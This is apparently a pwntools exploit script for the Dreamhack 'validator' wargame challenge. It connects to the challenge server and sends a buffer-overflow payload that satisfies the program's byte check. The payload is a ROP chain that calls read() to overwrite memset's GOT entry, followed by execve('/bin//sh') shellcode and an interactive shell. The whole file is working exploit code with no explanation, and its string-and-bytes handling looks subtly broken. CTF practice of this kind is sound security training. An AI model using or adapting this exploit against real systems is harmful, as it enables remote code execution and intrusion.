from pwn import *

r=remote("host2.dreamhack.games",17929)
print("remote success")
a=ELF("./validator_dist",checksec=False)
payload = "DREAMHACK!"
 
lst = []
for i in range(118,0,-1):
    lst.append(i)
payload += bytearray(lst)
payload += p64(0)

#payload += p64(a.symbols["read"])
payload += p64(0x4006f3)
payload += p64(0)
payload += p64(0x4006f2)
payload += p64(a.got["memset"])
#payload += p64(0)
payload += p64(0x40057b)
payload += p64(0x50)

payload += p64(a.symbols["read"])
payload += p64(a.got["memset"])


r.sendline(str(payload))
r.sendline("\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05")
r.interactive()
